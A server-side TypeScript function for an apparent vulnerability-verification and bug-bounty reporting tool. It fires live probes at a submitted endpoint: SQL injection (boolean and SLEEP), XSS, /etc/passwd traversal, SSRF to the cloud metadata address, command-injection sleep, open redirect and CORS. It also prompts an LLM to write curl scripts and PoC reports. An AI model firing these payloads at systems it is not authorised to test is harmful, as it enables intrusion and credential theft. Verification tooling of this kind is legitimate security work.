import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const authClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? "",
      { global: { headers: { Authorization: req.headers.get("Authorization")! } } }
    );
    const { data: { user }, error: authError } = await authClient.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const body = await req.json();
    const { action, finding, script, verificationResult } = body;

    if (action === "generate_script") {
      const generatedScript = await generateVerificationScript(finding, LOVABLE_API_KEY);
      return new Response(JSON.stringify({ script: generatedScript }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (action === "run_verification") {
      const result = await runVerification(finding, script, user.id, authClient);
      return new Response(JSON.stringify(result), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    if (action === "generate_poc") {
      const report = await generatePOCReport(finding, verificationResult, LOVABLE_API_KEY);
      return new Response(JSON.stringify({ report }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    return new Response(JSON.stringify({ error: "Invalid action" }), {
      status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  } catch (e) {
    console.error("verify-finding error:", e);
    return new Response(JSON.stringify({ error: e.message || "Internal error" }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" }
    });
  }
});

async function generateVerificationScript(finding: any, apiKey: string | undefined): Promise<string> {
  if (!apiKey) return generateLocalScript(finding);

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are an expert penetration tester generating verification scripts. Output ONLY the script content — no markdown fences, no explanations. The script should be a series of curl commands with comments explaining each test. Include:
1. The exact reproduction steps using curl
2. Multiple test variations to confirm the finding
3. Expected vs actual response comparison logic
4. Clear comments marking what confirms the vulnerability
Be specific to the vulnerability type and endpoint.`
          },
          {
            role: "user",
            content: `Generate a verification test script for this finding:
Title: ${finding.title}
Endpoint: ${finding.endpoint}
Method: ${finding.method || "GET"}
Payload: ${finding.payload || "N/A"}
Evidence: ${finding.evidence || "N/A"}
CWE: ${finding.cwe || "N/A"}
Category: ${finding.category || "N/A"}
Severity: ${finding.severity}`
          }
        ],
        max_tokens: 2000,
      }),
    });

    if (!resp.ok) return generateLocalScript(finding);

    const data = await resp.json();
    return data.choices?.[0]?.message?.content || generateLocalScript(finding);
  } catch {
    return generateLocalScript(finding);
  }
}

function generateLocalScript(finding: any): string {
  const url = finding.endpoint || "";
  const method = finding.method || "GET";
  const payload = finding.payload || "";
  const cwe = finding.cwe || "";

  if (cwe.includes("89") || finding.category === "sqli") {
    return `# SQL Injection Verification
# Target: ${url}

# Test 1: Error-based detection
curl -v "${url}${url.includes("?") ? "&" : "?"}id=1'"

# Test 2: Boolean-based blind
curl -s -o /dev/null -w "%{http_code}" "${url}${url.includes("?") ? "&" : "?"}id=1 AND 1=1"
curl -s -o /dev/null -w "%{http_code}" "${url}${url.includes("?") ? "&" : "?"}id=1 AND 1=2"

# Test 3: Original payload
curl -v "${url}${url.includes("?") ? "&" : "?"}${payload}"

# Confirm: Different responses = SQLi confirmed`;
  }

  if (cwe.includes("79") || finding.category === "xss") {
    return `# XSS Verification
# Target: ${url}

# Test 1: Reflected XSS check
curl -v "${url}${url.includes("?") ? "&" : "?"}q=${encodeURIComponent(payload || "<script>alert(1)</script>")}"

# Test 2: Event handler bypass
curl -v "${url}${url.includes("?") ? "&" : "?"}q=${encodeURIComponent("<img src=x onerror=alert(1)>")}"

# Confirm: Unescaped payload in response body = XSS confirmed`;
  }

  return `# Vulnerability Verification
# Finding: ${finding.title}
# Target: ${url}

curl -v -X ${method} "${url}" ${payload ? `-d "${payload}"` : ""}

# Review response for: ${finding.evidence || "vulnerability indicators"}`;
}

// ── SSRF guard: block scans against internal targets even from server-side verifier
function isPrivateHost(host: string): boolean {
  const h = host.toLowerCase();
  if (h === "localhost" || h.endsWith(".local") || h.endsWith(".internal")) return true;
  if (/^(127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0)/.test(h)) return true;
  if (/^172\.(1[6-9]|2\d|3[01])\./.test(h)) return true;
  if (/^(::1|fc00:|fd00:|fe80:)/i.test(h)) return true;
  return false;
}

interface Probe {
  step: number;
  label: string;
  request: string;
  status: number;
  responseTime: number;
  bodySnippet: string;
  headers: Record<string, string>;
  bodyLen: number;
  bodyHash: string;
}

// ── Retry/backoff state shared per verification run
interface RetryStats {
  total: number;
  retried: number;
  failures5xx: number;
  timeouts: number;
  giveUps: number;
  lastErrors: string[];
}

async function httpProbe(
  url: string,
  method: string,
  label: string,
  step: number,
  body?: string,
  extraHeaders?: Record<string,string>,
  retryStats?: RetryStats,
): Promise<Probe | null> {
  if (retryStats) retryStats.total++;
  const MAX_ATTEMPTS = 3;
  const BASE_DELAY = 700; // ms — exponential backoff base
  let lastErr = "";

  try {
    const u = new URL(url);
    if (isPrivateHost(u.hostname)) {
      return { step, label: `${label} [BLOCKED private host]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "blocked", headers: {}, bodyLen: 0, bodyHash: "0" };
    }
  } catch {
    return { step, label: `${label} [INVALID URL]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: "invalid url", headers: {}, bodyLen: 0, bodyHash: "0" };
  }

  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const start = Date.now();
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 12000);
      const resp = await fetch(url, {
        method,
        headers: { "User-Agent": "OmniSec-Verifier/2.0 (+exploit-engine)", "Accept": "*/*", ...(extraHeaders || {}) },
        body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
        redirect: "manual",
        signal: ctrl.signal,
      });
      clearTimeout(t);
      const rt = Date.now() - start;
      const text = await resp.text().catch(() => "");
      const hdrs = Object.fromEntries(resp.headers.entries());

      // Retry on 5xx
      if (resp.status >= 500 && resp.status < 600 && attempt < MAX_ATTEMPTS) {
        if (retryStats) { retryStats.retried++; retryStats.failures5xx++; retryStats.lastErrors.push(`${label}: HTTP ${resp.status} (attempt ${attempt})`); }
        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
        continue;
      }
      if (resp.status >= 500 && retryStats) { retryStats.failures5xx++; retryStats.giveUps++; }

      let h = 0; for (let i = 0; i < text.length; i++) { h = ((h << 5) - h) + text.charCodeAt(i); h = h & h; }
      return {
        step, label: attempt > 1 ? `${label} [retry x${attempt-1}]` : label,
        request: `${method} ${url}\nUser-Agent: OmniSec-Verifier/2.0`,
        status: resp.status, responseTime: rt,
        bodySnippet: text.slice(0, 1500),
        headers: hdrs,
        bodyLen: text.length,
        bodyHash: Math.abs(h).toString(36),
      };
    } catch (e: any) {
      lastErr = e.message || String(e);
      const isTimeout = /abort|timeout/i.test(lastErr);
      if (retryStats) {
        if (isTimeout) retryStats.timeouts++;
        retryStats.lastErrors.push(`${label}: ${lastErr} (attempt ${attempt})`);
      }
      if (attempt < MAX_ATTEMPTS) {
        if (retryStats) retryStats.retried++;
        await new Promise(r => setTimeout(r, BASE_DELAY * Math.pow(2, attempt - 1)));
        continue;
      }
      if (retryStats) retryStats.giveUps++;
      return { step, label: `${label} [ERROR after ${MAX_ATTEMPTS} attempts: ${lastErr}]`, request: `${method} ${url}`, status: 0, responseTime: 0, bodySnippet: lastErr, headers: {}, bodyLen: 0, bodyHash: "0" };
    }
  }
  return null;
}

function injectParam(url: string, value: string, paramName?: string): string {
  try {
    const u = new URL(url);
    if (paramName) u.searchParams.set(paramName, value);
    else if ([...u.searchParams.keys()].length > 0) {
      const k = [...u.searchParams.keys()][0];
      u.searchParams.set(k, value);
    } else {
      u.searchParams.set("id", value);
    }
    return u.toString();
  } catch {
    const sep = url.includes("?") ? "&" : "?";
    return `${url}${sep}${paramName || "id"}=${encodeURIComponent(value)}`;
  }
}

async function runVerification(finding: any, _script: string): Promise<any> {
  const endpoint = finding.endpoint || "";
  const method = (finding.method || "GET").toUpperCase();
  const category = (finding.category || "").toLowerCase();
  const cwe = String(finding.cwe || "");
  const param = finding.vulnerable_parameter || finding.parameter;

  const probes: Probe[] = [];
  let confirmed = false;
  const reasons: string[] = [];
  const steps: string[] = [];

  // Probe 0: baseline
  const baseline = await httpProbe(endpoint, method, "Baseline (no payload)", 0);
  if (baseline) probes.push(baseline);

  // Strategy per category
  if (cwe.includes("89") || category === "sqli" || category === "sql") {
    // Boolean-based oracle: TRUE vs FALSE divergence
    const trueUrl = injectParam(endpoint, "1' OR '1'='1", param);
    const falseUrl = injectParam(endpoint, "1' AND '1'='2", param);
    const errUrl = injectParam(endpoint, "1'\"", param);
    const t = await httpProbe(trueUrl, method, "Boolean TRUE payload (1' OR '1'='1)", 1);
    const f = await httpProbe(falseUrl, method, "Boolean FALSE payload (1' AND '1'='2)", 2);
    const e = await httpProbe(errUrl, method, "Error trigger payload (1'\")", 3);
    [t,f,e].forEach(p => p && probes.push(p));
    const sqlErrRx = /(sql syntax|mysql_fetch|ORA-\d+|PostgreSQL|SQLite|SQLSTATE|unclosed quotation|unterminated|odbc|System\.Data\.SqlClient|MySqlException)/i;
    if (e && sqlErrRx.test(e.bodySnippet)) { confirmed = true; reasons.push(`Database error string surfaced after injecting quote (${e.bodySnippet.match(sqlErrRx)?.[0]})`); }
    if (baseline && t && f && t.bodyLen !== f.bodyLen && Math.abs(t.bodyLen - baseline.bodyLen) < Math.abs(f.bodyLen - baseline.bodyLen) - 50) {
      confirmed = true;
      reasons.push(`Boolean oracle confirmed: TRUE-payload body matches baseline (${t.bodyLen}b ~ ${baseline.bodyLen}b) but FALSE-payload diverges (${f.bodyLen}b)`);
    }
    // Time-based probe
    const sleepUrl = injectParam(endpoint, "1' AND SLEEP(4)-- -", param);
    const sl = await httpProbe(sleepUrl, method, "Time-based payload (SLEEP(4))", 4);
    if (sl) { probes.push(sl); if (sl.responseTime > 3500 && (!baseline || baseline.responseTime < 2000)) { confirmed = true; reasons.push(`Time-based SQLi: SLEEP(4) caused ${sl.responseTime}ms response vs baseline ${baseline?.responseTime}ms`); } }
    steps.push("1. Send baseline request to capture normal length & timing.",
      "2. Inject TRUE-condition payload — should match baseline.",
      "3. Inject FALSE-condition payload — divergence proves SQL truth-table reaches the DB.",
      "4. Inject quote to trigger DB error message.",
      "5. Inject SLEEP() — measurable delay confirms blind SQLi.");
  }

  else if (cwe.includes("79") || category === "xss") {
    const marker = `xss${Math.random().toString(36).slice(2,8)}`;
    const html = `"><svg/onload=confirm(1)>${marker}`;
    const probe = await httpProbe(injectParam(endpoint, html, param), method, "XSS payload reflection", 1);
    if (probe) probes.push(probe);
    if (probe && probe.bodySnippet.includes(marker)) {
      const ctx = probe.bodySnippet.indexOf(html) >= 0 ? "raw HTML (unencoded)" : probe.bodySnippet.includes(`&lt;svg`) ? "HTML-encoded (NOT vulnerable)" : "partial encoding";
      if (ctx === "raw HTML (unencoded)") { confirmed = true; reasons.push(`Payload reflected unencoded — context: ${ctx}`); }
      else reasons.push(`Marker reflected but encoded — likely false positive (${ctx})`);
    }
    steps.push("1. Inject unique marker + XSS vector.",
      "2. Search response body for raw payload vs encoded form.",
      "3. Confirm execution context (HTML body / attribute / script).");
  }

  else if (cwe.includes("22") || category === "traversal" || category === "lfi") {
    const payloads = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"];
    for (let i = 0; i < payloads.length; i++) {
      const p = await httpProbe(injectParam(endpoint, payloads[i], param), method, `Path-traversal payload #${i+1}`, i+1);
      if (p) { probes.push(p); if (/root:[x*]:0:0:/i.test(p.bodySnippet) || /\[boot loader\]/i.test(p.bodySnippet)) { confirmed = true; reasons.push(`/etc/passwd content recovered with payload "${payloads[i]}"`); break; } }
    }
    steps.push("1. Inject canonical traversal sequences.", "2. Try URL-encoded and double-encoded variants.", "3. Confirm by matching root:x:0:0: pattern.");
  }

  else if (cwe.includes("601") || category === "redirect") {
    const evil = "https://evil-canary.example.org/poc";
    const r = await httpProbe(injectParam(endpoint, evil, param || "url"), method, "Open-redirect probe (Location header)", 1);
    if (r) probes.push(r);
    const loc = r?.headers["location"] || "";
    if (r && r.status >= 300 && r.status < 400 && loc.includes("evil-canary.example.org")) { confirmed = true; reasons.push(`HTTP ${r.status} redirected to attacker URL via Location: ${loc}`); }
    steps.push("1. Submit attacker URL as redirect target.", "2. Confirm Location header echoes attacker domain with 3xx status.");
  }

  else if (cwe.includes("346") || category === "cors") {
    const r = await httpProbe(endpoint, "GET", "CORS probe with attacker Origin", 1, undefined, { "Origin": "https://evil-canary.example.org" });
    if (r) probes.push(r);
    const acao = r?.headers["access-control-allow-origin"];
    const acac = r?.headers["access-control-allow-credentials"];
    if (acao === "https://evil-canary.example.org" || acao === "*") {
      confirmed = true;
      reasons.push(`Permissive CORS: ACAO=${acao}${acac === "true" ? " with credentials=true (CRITICAL)" : ""}`);
    }
    steps.push("1. Send request with attacker Origin header.", "2. Inspect ACAO/ACAC headers for reflection or wildcard.");
  }

  else if (category === "ssrf" || cwe.includes("918")) {
    const oast = `https://omnisec-canary-${Math.random().toString(36).slice(2,8)}.example.org/probe`;
    const meta = "http://169.254.169.254/latest/meta-data/";
    const r1 = await httpProbe(injectParam(endpoint, oast, param || "url"), method, "SSRF — external canary", 1);
    const r2 = await httpProbe(injectParam(endpoint, meta, param || "url"), method, "SSRF — cloud metadata fetch", 2);
    [r1,r2].forEach(p => p && probes.push(p));
    if (r2 && /ami-id|instance-id|iam\/security-credentials/i.test(r2.bodySnippet)) { confirmed = true; reasons.push("Cloud metadata service contents echoed in response — full SSRF to AWS IMDS"); }
    steps.push("1. Submit external canary to confirm outbound HTTP from server.", "2. Submit IMDS URL — metadata in response confirms SSRF.");
  }

  else if (category === "cmdi" || cwe.includes("78")) {
    const sleepP = await httpProbe(injectParam(endpoint, "1;sleep 4;", param), method, "Cmd-injection time probe", 1);
    if (sleepP) { probes.push(sleepP); if (sleepP.responseTime > 3500) { confirmed = true; reasons.push(`Command sleep delay observed: ${sleepP.responseTime}ms`); } }
    steps.push("1. Inject ; sleep N; payload.", "2. Compare elapsed time to baseline.");
  }

  else {
    // Generic: replay once with payload and look for evidence echo
    const payload = finding.payload || "";
    const url = payload ? injectParam(endpoint, payload, param) : endpoint;
    const r = await httpProbe(url, method, "Generic replay with original payload", 1);
    if (r) probes.push(r);
    if (r && finding.evidence && r.bodySnippet.toLowerCase().includes(String(finding.evidence).slice(0,80).toLowerCase())) {
      confirmed = true; reasons.push("Original evidence pattern still present in response");
    }
    steps.push("1. Replay the original payload.", "2. Compare response to recorded evidence.");
  }

  // Build human report
  const requestLog = probes.map(p => `[Step ${p.step}] ${p.label}\n${p.request}`).join("\n\n");
  const responseLog = probes.map(p => `[Step ${p.step}] ${p.label}\nHTTP ${p.status} • ${p.responseTime}ms • ${p.bodyLen}b • hash=${p.bodyHash}\n${Object.entries(p.headers).slice(0,8).map(([k,v])=>`${k}: ${v}`).join("\n")}\n\n${p.bodySnippet.slice(0,800)}`).join("\n\n──────────\n\n");

  const analysis = confirmed
    ? `✅ CONFIRMED (${reasons.length} signal${reasons.length>1?"s":""}): ${reasons.join(" | ")}`
    : reasons.length
      ? `⚠️ Inconclusive — partial signals: ${reasons.join(" | ")}. Manual review recommended.`
      : `❌ NOT CONFIRMED — ${probes.length} probes executed, none triggered the vulnerability oracle. Likely false positive or requires authenticated context.`;

  return {
    confirmed,
    request: requestLog,
    response: responseLog,
    statusCode: probes[probes.length-1]?.status ?? 0,
    responseTime: probes.reduce((s,p)=>s+p.responseTime,0),
    analysis,
    probes: probes.length,
    reproductionSteps: steps,
    reasons,
  };
}

function analyzeResponse(finding: any, body: string, status: number, headers: any, responseTime: number): { isVulnerable: boolean; analysis: string } {
  const cwe = finding.cwe || "";
  const payload = finding.payload || "";
  const bodyLower = body.toLowerCase();
  const reasons: string[] = [];
  let isVulnerable = false;

  // SQL Injection indicators
  if (cwe.includes("89") || finding.category === "sqli") {
    const sqlErrors = ["sql syntax", "mysql", "postgresql", "sqlite", "ora-", "you have an error", "unclosed quotation", "unterminated", "syntax error", "warning: mysql", "sqlstate"];
    for (const err of sqlErrors) {
      if (bodyLower.includes(err)) {
        isVulnerable = true;
        reasons.push(`SQL error string detected: "${err}"`);
      }
    }
    if (payload && body.includes(payload)) {
      reasons.push("Payload reflected in response");
    }
  }

  // XSS indicators
  if (cwe.includes("79") || finding.category === "xss") {
    if (payload && body.includes(payload)) {
      isVulnerable = true;
      reasons.push("Payload reflected unescaped in response body");
    }
    const xssPatterns = ["<script", "onerror=", "onload=", "javascript:", "alert("];
    for (const p of xssPatterns) {
      if (body.includes(p) && payload.toLowerCase().includes(p)) {
        isVulnerable = true;
        reasons.push(`XSS pattern "${p}" found unfiltered`);
      }
    }
  }

  // CORS
  if (cwe.includes("346") || finding.category === "cors") {
    const acao = headers["access-control-allow-origin"];
    if (acao === "*" || (acao && acao !== "null")) {
      isVulnerable = true;
      reasons.push(`Permissive CORS: Access-Control-Allow-Origin: ${acao}`);
    }
  }

  // Directory Traversal
  if (cwe.includes("22") || finding.category === "traversal") {
    if (bodyLower.includes("root:") || bodyLower.includes("[boot loader]") || bodyLower.includes("/etc/passwd")) {
      isVulnerable = true;
      reasons.push("System file content detected in response");
    }
  }

  // Open Redirect
  if (cwe.includes("601") || finding.category === "redirect") {
    if (status >= 300 && status < 400) {
      const location = headers["location"] || "";
      if (location.includes("evil.com") || location.includes("attacker")) {
        isVulnerable = true;
        reasons.push(`Redirect to external domain: ${location}`);
      }
    }
  }

  // Cookie issues
  if (finding.category === "cookie") {
    const setCookie = headers["set-cookie"] || "";
    if (setCookie && !setCookie.toLowerCase().includes("httponly")) {
      isVulnerable = true;
      reasons.push("Cookie missing HttpOnly flag");
    }
    if (setCookie && !setCookie.toLowerCase().includes("secure")) {
      isVulnerable = true;
      reasons.push("Cookie missing Secure flag");
    }
  }

  // Generic: if the original evidence string appears in response
  if (!isVulnerable && finding.evidence) {
    const evidenceKey = finding.evidence.slice(0, 100).toLowerCase();
    if (bodyLower.includes(evidenceKey)) {
      isVulnerable = true;
      reasons.push("Original evidence pattern found in response");
    }
  }

  const analysis = isVulnerable
    ? `CONFIRMED: ${reasons.join(". ")}`
    : reasons.length > 0
      ? `Partial indicators found but not conclusive: ${reasons.join(". ")}. Manual review recommended.`
      : `No vulnerability indicators detected in response (HTTP ${status}, ${responseTime}ms). The finding may require different test conditions or authentication context.`;

  return { isVulnerable, analysis };
}

async function generatePOCReport(finding: any, verificationResult: any, apiKey: string | undefined): Promise<string> {
  if (!apiKey) return generateLocalPOC(finding, verificationResult);

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          {
            role: "system",
            content: `You are a professional bug bounty hunter writing a POC report. Write in Markdown format. Include:
1. Title and severity summary table
2. Detailed description of the vulnerability
3. Step-by-step reproduction with exact curl commands
4. Request/Response evidence
5. Impact analysis (what an attacker can achieve)
6. CVSS scoring justification
7. Remediation recommendations
8. References (CWE, OWASP, relevant resources)
Be professional, detailed, and ready for HackerOne/Bugcrowd submission.`
          },
          {
            role: "user",
            content: `Generate a bug bounty POC report:
Title: ${finding.title}
Severity: ${finding.severity}
CWE: ${finding.cwe || "N/A"}
CVSS: ${finding.cvss || "N/A"}
Endpoint: ${finding.endpoint}
Method: ${finding.method || "GET"}
Payload: ${finding.payload || "N/A"}
Description: ${finding.description}
Evidence: ${finding.evidence || "N/A"}
Secondary Evidence: ${finding.evidence2 || "N/A"}
Remediation: ${finding.remediation}
Category: ${finding.category || "N/A"}
${verificationResult ? `\nAutomated Verification Verdict: ${verificationResult.confirmed ? "CONFIRMED" : "NOT CONFIRMED"}\nProbes run: ${verificationResult.probes ?? 0}\nReproduction steps already executed:\n${(verificationResult.reproductionSteps || []).join("\n")}\n\nProbe Requests:\n${verificationResult.request}\n\nProbe Responses:\n${verificationResult.response?.slice(0, 3500)}\n\nOracle Analysis: ${verificationResult.analysis}\n\nWrite the report ONLY based on the data above. If verdict is NOT CONFIRMED, mark severity as Informational and explain why the oracle did not trigger.` : ""}`
          }
        ],
        max_tokens: 4000,
      }),
    });

    if (!resp.ok) return generateLocalPOC(finding, verificationResult);

    const data = await resp.json();
    return data.choices?.[0]?.message?.content || generateLocalPOC(finding, verificationResult);
  } catch {
    return generateLocalPOC(finding, verificationResult);
  }
}

function generateLocalPOC(finding: any, verificationResult: any): string {
  const verdict = verificationResult?.confirmed
    ? "✅ **CONFIRMED — exploit oracle triggered**"
    : "⚠️ Not confirmed by automated oracle (manual review required)";
  const stepsList = (verificationResult?.reproductionSteps || []).map((s: string, i: number) => `${i+1}. ${s}`).join("\n");
  return `# Bug Bounty Report — ${finding.title}

## Summary
| Field | Value |
|-------|-------|
| **Vulnerability** | ${finding.title} |
| **Verification** | ${verdict} |
| **Severity** | ${(finding.severity || "medium").toUpperCase()} |
| **CWE** | ${finding.cwe || "N/A"} |
| **CVSS** | ${finding.cvss || "N/A"} |
| **Endpoint** | \`${finding.endpoint}\` |
| **Method** | ${finding.method || "GET"} |
| **Probes run** | ${verificationResult?.probes ?? 0} |

## Description
${finding.description || "N/A"}

## Reproduction Methodology
${stepsList || "1. Replay the request shown below.\n2. Inspect the response for the documented evidence."}

## Curl Reproduction
\`\`\`bash
curl -i -X ${finding.method || "GET"} "${finding.endpoint}" ${finding.payload ? `--data-urlencode "${finding.payload}"` : ""}
\`\`\`

## Verification Probes — Requests
\`\`\`
${verificationResult?.request || `${finding.method || "GET"} ${finding.endpoint}`}
\`\`\`

## Verification Probes — Responses
\`\`\`
${verificationResult?.response?.slice(0, 4000) || finding.evidence || "See description"}
\`\`\`

## Oracle Analysis
${verificationResult?.analysis || "No analysis available."}

## Impact
${finding.severity === "critical" || finding.severity === "high"
    ? "An attacker can leverage this issue to gain unauthorized data access, execute code, or disrupt service. See CWE for the canonical impact chain."
    : "This issue weakens the security posture and should be fixed."}

## Remediation
${finding.remediation || "Apply appropriate security controls."}

## References
- CWE: ${finding.cwe || "N/A"}
- OWASP: https://owasp.org/www-project-top-ten/
`;
}
